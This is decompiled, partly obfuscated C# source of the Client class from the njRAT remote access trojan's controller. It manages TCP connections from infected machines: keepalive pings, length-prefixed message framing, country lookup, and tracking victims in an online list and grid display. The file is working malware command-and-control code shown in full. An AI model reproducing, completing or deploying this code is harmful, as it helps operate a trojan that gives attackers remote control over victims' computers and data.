using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace njRAT
{
	// Token: 0x02000036 RID: 54
	public class Client
	{
		// Token: 0x0600016D RID: 365 RVA: 0x00012B4C File Offset: 0x00010D4C
		public Client(TcpClient c, SK sk)
		{
			this.plg = new List<string>();
			this.IsPNGED = false;
			this.lastAC = string.Empty;
			this.lastPing = DateTime.Now;
			this.isPL = false;
			this.Isend = false;
			this.\u0002 = string.Empty;
			this.CN = true;
			this.NoPing = false;
			this.\u0003 = false;
			this.\u0005 = 5;
			this.Co = \u0006\u2001.\u0002(-1829137276);
			this.CName = \u0006\u2001.\u0002(-1829118686);
			this.msec = 0L;
			this.lastPC = default(DateTime);
			this.t = new System.Threading.Timer(delegate(object \u0002)
			{
				this.\u0002();
			}, null, 0, 3000);
			this.M = new MemoryStream();
			this.b = new byte[1];
			this.\u0008 = string.Empty;
			this.Length = -1L;
			this.osk = null;
			this.\u0006 = false;
			this.Client = c;
			this.SK = sk;
			try
			{
				\u0002\u2000 u0002_u = \u000E\u2000.\u0005\u2002.\u0003(c.Client.RemoteEndPoint.ToString().Split(new char[]
				{
					':'
				})[0]);
				this.Co = u0002_u.\u0002();
				this.CName = u0002_u.\u0003();
				if (Operators.CompareString(this.Co, \u0006\u2001.\u0002(-1829133567), false) == 0 | Operators.CompareString(this.Co, \u0006\u2001.\u0002(-1829133544), false) == 0)
				{
					this.Co = \u0006\u2001.\u0002(-1829137276);
				}
				if (!\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.ContainsKey(this.Co + \u0006\u2001.\u0002(-1829118668)))
				{
					this.Co = \u0006\u2001.\u0002(-1829137276);
				}
				this.COI = (Bitmap)\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images[this.Co + \u0006\u2001.\u0002(-1829118668)];
			}
			catch (Exception ex)
			{
			}
			this.Client.Client.BeginReceive(this.b, 0, this.b.Length, SocketFlags.None, new AsyncCallback(this.b_read), null);
		}

		// Token: 0x0600016E RID: 366 RVA: 0x00012DBC File Offset: 0x00010FBC
		public int rp()
		{
			if (this.Length == -1L)
			{
				return 0;
			}
			int result;
			try
			{
				result = checked(\u000E.\u0002((int)this.M.Length, (int)this.Length));
			}
			catch (Exception ex)
			{
				result = 0;
			}
			return result;
		}

		// Token: 0x0600016F RID: 367 RVA: 0x00012E1C File Offset: 0x0001101C
		private void \u0002()
		{
			if (this.\u0003 | this.\u0006)
			{
				return;
			}
			lock (this)
			{
				this.\u0003 = true;
				if (!this.CN)
				{
					this.Close();
				}
				else
				{
					double totalSeconds = DateAndTime.Now.Subtract(this.lastPing).TotalSeconds;
					if (!this.isPL && (this.L == null & totalSeconds > 8.0))
					{
						this.\u0008 = \u0006\u2001.\u0002(-1829118260);
						this.Close();
					}
					else
					{
						if (!this.NoPing)
						{
							if (!this.IsPNGED)
							{
								if (totalSeconds >= (double)this.\u0005)
								{
									this.\u0005 = 15;
									string empty = string.Empty;
									this.SEND_(\u000E.\u0002(ref empty));
									this.IsPNGED = true;
									this.lastPing = DateAndTime.Now;
									if (!this.CN)
									{
										this.Close();
										return;
									}
								}
							}
							else if (this.SendingProgress == 0 & !this.isPL & totalSeconds > 6.0 & this.L != null)
							{
								try
								{
									if (this.L.Cells.Count > \u000E\u2000.\u0008\u2001)
									{
										this.L.Cells[\u000E\u2000.\u0008\u2001].Value = \u0006\u2001.\u0002(-1829118243);
										this.L.Cells[\u000E\u2000.\u0008\u2001].Style.ForeColor = Color.Red;
										this.SEND_(new byte[1025]);
										if (!this.CN)
										{
											this.Close();
											return;
										}
									}
								}
								catch (Exception ex)
								{
									this.Close();
									return;
								}
							}
						}
						this.\u0003 = false;
					}
				}
			}
		}

		// Token: 0x06000170 RID: 368 RVA: 0x00013048 File Offset: 0x00011248
		public string ip()
		{
			if (this.\u0002.Length > 0)
			{
				return this.\u0002;
			}
			try
			{
				this.\u0002 = this.Client.Client.RemoteEndPoint.ToString();
			}
			catch (Exception ex)
			{
				this.\u0002 = this.GetHashCode().ToString();
			}
			return this.\u0002;
		}

		// Token: 0x06000171 RID: 369 RVA: 0x000130C8 File Offset: 0x000112C8
		public void SEND_(byte[] b)
		{
			checked
			{
				try
				{
					lock (this)
					{
						this.SendingProgress = 0;
						string[] array = null;
						if (b.Length > 3)
						{
							array = new string[]
							{
								Conversions.ToString(Strings.ChrW((int)b[0])) + Conversions.ToString(Strings.ChrW((int)b[1])) + Conversions.ToString(Strings.ChrW((int)b[2]))
							};
							if (!(Operators.CompareString(array[0], \u0006\u2001.\u0002(-1829128303), false) == 0 | Operators.CompareString(array[0], \u0006\u2001.\u0002(-1829137245) + Conversions.ToString(Strings.ChrW((int)b[2])), false) == 0 | Operators.CompareString(array[0], \u0006\u2001.\u0002(-1829137025) + Conversions.ToString(Strings.ChrW((int)b[2])), false) == 0 | Operators.CompareString(array[0], \u0006\u2001.\u0002(-1829128293), false) == 0 | Operators.CompareString(array[0], \u0006\u2001.\u0002(-1829128556), false) == 0))
							{
								array = null;
							}
						}
						int num = 0;
						MemoryStream memoryStream = new MemoryStream();
						string text = b.Length.ToString() + \u0006\u2001.\u0002(-1829129109);
						byte[] array2 = \u000E.\u0002(ref text);
						memoryStream.Write(array2, 0, array2.Length);
						memoryStream.Write(b, 0, b.Length);
						int i = 1;
						long length = memoryStream.Length;
						memoryStream.Position = 0L;
						while (i >= 1)
						{
							byte[] array3 = new byte[10241];
							i = memoryStream.Read(array3, 0, array3.Length);
							this.Client.Client.Poll(-1, SelectMode.SelectWrite);
							try
							{
								this.Client.Client.Send(array3, 0, i, SocketFlags.None);
							}
							catch (SocketException ex)
							{
								this.SendingProgress = 0;
								this.\u0008 = ex.SocketErrorCode.ToString();
								this.CN = false;
								return;
							}
							\u000E\u2000.\u0008 += unchecked((long)i);
							num += i;
							if (!this.CN | this.\u0006)
							{
								return;
							}
							if (array != null)
							{
								this.SendingProgress = \u000E.\u0002(num, (int)length);
							}
						}
						memoryStream.Dispose();
						this.SendingProgress = 0;
					}
				}
				catch (Exception ex2)
				{
					this.SendingProgress = 0;
					this.\u0008 = \u0006\u2001.\u0002(-1829118673);
					this.CN = false;
				}
			}
		}

		// Token: 0x06000172 RID: 370 RVA: 0x00013390 File Offset: 0x00011590
		public void Send(byte[] b)
		{
			if (!this.CN)
			{
				return;
			}
			ThreadPool.QueueUserWorkItem(delegate(object \u0002)
			{
				this.SEND_((byte[])\u0002);
			}, b);
		}

		// Token: 0x06000173 RID: 371 RVA: 0x000133B4 File Offset: 0x000115B4
		public bool Send(string S)
		{
			this.Send(\u000E.\u0002(ref S));
			bool result;
			return result;
		}

		// Token: 0x06000174 RID: 372 RVA: 0x000133D0 File Offset: 0x000115D0
		public void b_read(IAsyncResult ar)
		{
			checked
			{
				if (!(!this.CN | this.\u0006))
				{
					try
					{
						int num = 0;
						try
						{
							num = this.Client.Client.EndReceive(ar);
						}
						catch (SocketException ex)
						{
							this.\u0008 = ex.SocketErrorCode.ToString();
							goto IL_38C;
						}
						if (num <= 0)
						{
							goto IL_38C;
						}
						\u000E\u2000.\u0006 += unchecked((long)num);
						if (this.Length == -1L)
						{
							if (this.b[0] == 0)
							{
								byte[] array = this.M.ToArray();
								this.Length = Conversions.ToLong(\u000E.\u0002(ref array));
								this.M.Dispose();
								this.M = new MemoryStream();
								if (this.Length == 0L)
								{
									this.Length = -1L;
									if (this.L == null & !this.isPL)
									{
										this.\u0008 = \u0006\u2001.\u0002(-1829118260);
										goto IL_38C;
									}
									int num2 = (int)Math.Round(unchecked(DateAndTime.Now.Subtract(this.lastPing).TotalMilliseconds - 10.0) / 1.5);
									if (num2 < 0)
									{
										num2 = 0;
									}
									if (num2 > 999)
									{
										num2 = 999;
									}
									this.lastPing = DateAndTime.Now;
									this.IsPNGED = false;
									string text = \u0006\u2001.\u0002(-1829129003) + \u000E\u2000.\u000E + num2.ToString(\u0006\u2001.\u0002(-1829118711));
									\u0008\u2001 u0008_u = new \u0008\u2001(this, \u000E.\u0002(ref text));
									List<\u0008\u2001> req = this.SK.REQ;
									lock (req)
									{
										this.SK.REQ.Add(u0008_u);
										goto IL_1D6;
									}
									IL_1D0:
									Thread.Sleep(1);
									IL_1D6:
									if (u0008_u.\u0005)
									{
										goto IL_323;
									}
									goto IL_1D0;
								}
								else
								{
									this.b = new byte[(int)(this.Length - 1L) + 1];
								}
							}
							else
							{
								this.M.WriteByte(this.b[0]);
							}
						}
						else
						{
							this.M.Write(this.b, 0, num);
							if (this.M.Length == this.Length)
							{
								this.Length = -1L;
								\u0008\u2001 u0008_u2 = new \u0008\u2001(this, this.M.ToArray());
								List<\u0008\u2001> req2 = this.SK.REQ;
								lock (req2)
								{
									this.SK.REQ.Add(u0008_u2);
									goto IL_299;
								}
								IL_293:
								Thread.Sleep(1);
								IL_299:
								if (!u0008_u2.\u0005)
								{
									goto IL_293;
								}
								this.M.Dispose();
								this.M = new MemoryStream();
								this.b = new byte[1];
							}
							else
							{
								this.b = new byte[(int)(this.Length - this.M.Length - 1L) + 1];
							}
						}
						Thread.Sleep(1);
					}
					catch (Exception ex2)
					{
						this.\u0008 = \u0006\u2001.\u0002(-1829118689);
						goto IL_38C;
					}
					IL_323:
					if (!this.CN)
					{
						return;
					}
					try
					{
						this.Client.Client.BeginReceive(this.b, 0, this.b.Length, SocketFlags.None, new AsyncCallback(this.b_read), null);
						return;
					}
					catch (SocketException ex3)
					{
						this.\u0008 = ex3.SocketErrorCode.ToString();
					}
				}
				IL_38C:
				this.CN = false;
			}
		}

		// Token: 0x06000175 RID: 373 RVA: 0x000137F0 File Offset: 0x000119F0
		public void Close()
		{
			if (this.\u0006)
			{
				return;
			}
			this.\u0006 = true;
			this.CN = false;
			try
			{
				this.t.Dispose();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.M.Dispose();
			}
			catch (Exception ex2)
			{
			}
			try
			{
				if (this.Client.Connected)
				{
					this.Client.GetStream().Close();
				}
			}
			catch (Exception ex3)
			{
			}
			try
			{
				this.Client.Client.Close();
			}
			catch (Exception ex4)
			{
			}
			this.Isend = false;
			this.plg.Clear();
			if (Operators.CompareString(this.\u0008, string.Empty, false) == 0)
			{
				this.\u0008 = \u0006\u2001.\u0002(-1829118702);
			}
			if (this.L != null & !this.isPL)
			{
				if (\u000E\u2000.\u0002.\u0003)
				{
					\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(new object[]
					{
						Color.LightSteelBlue,
						\u000E.\u0002(),
						Color.DarkSlateBlue,
						this.COI,
						this.ip(),
						Color.IndianRed,
						RuntimeHelpers.GetObjectValue(\u000E\u2000.\u0002(this.L)),
						Color.DarkRed,
						this.\u0008
					});
				}
			}
			else if (\u000E\u2000.\u0002.\u0005)
			{
				\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(new object[]
				{
					Color.LightSteelBlue,
					\u000E.\u0002(),
					this.COI,
					Color.Red,
					this.ip(),
					Color.IndianRed,
					this.\u0008
				});
			}
			Collection online = \u000E\u2000.\u0005.Online;
			lock (online)
			{
				if (\u000E\u2000.\u0005.Online.Contains(this.ip()))
				{
					\u000E\u2000.\u0005.Online.Remove(this.ip());
				}
			}
			if (this.L != null)
			{
				\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(this.L);
			}
			this.L = null;
		}

		// Token: 0x04000107 RID: 263
		public List<string> plg;

		// Token: 0x04000108 RID: 264
		public TcpClient Client;

		// Token: 0x04000109 RID: 265
		public bool IsPNGED;

		// Token: 0x0400010A RID: 266
		public int SendingProgress;

		// Token: 0x0400010B RID: 267
		public string lastAC;

		// Token: 0x0400010C RID: 268
		public DateTime lastPing;

		// Token: 0x0400010D RID: 269
		public bool isPL;

		// Token: 0x0400010E RID: 270
		public string Folder;

		// Token: 0x0400010F RID: 271
		public bool Isend;

		// Token: 0x04000110 RID: 272
		public DataGridViewRow L;

		// Token: 0x04000111 RID: 273
		private string \u0002;

		// Token: 0x04000112 RID: 274
		public bool CN;

		// Token: 0x04000113 RID: 275
		public bool NoPing;

		// Token: 0x04000114 RID: 276
		private bool \u0003;

		// Token: 0x04000115 RID: 277
		private int \u0005;

		// Token: 0x04000116 RID: 278
		public string Co;

		// Token: 0x04000117 RID: 279
		public string CName;

		// Token: 0x04000118 RID: 280
		public long msec;

		// Token: 0x04000119 RID: 281
		public DateTime lastPC;

		// Token: 0x0400011A RID: 282
		public System.Threading.Timer t;

		// Token: 0x0400011B RID: 283
		public MemoryStream M;

		// Token: 0x0400011C RID: 284
		public byte[] b;

		// Token: 0x0400011D RID: 285
		public Bitmap COI;

		// Token: 0x0400011E RID: 286
		private string \u0008;

		// Token: 0x0400011F RID: 287
		public long Length;

		// Token: 0x04000120 RID: 288
		public SK SK;

		// Token: 0x04000121 RID: 289
		public Client osk;

		// Token: 0x04000122 RID: 290
		private bool \u0006;
	}
}
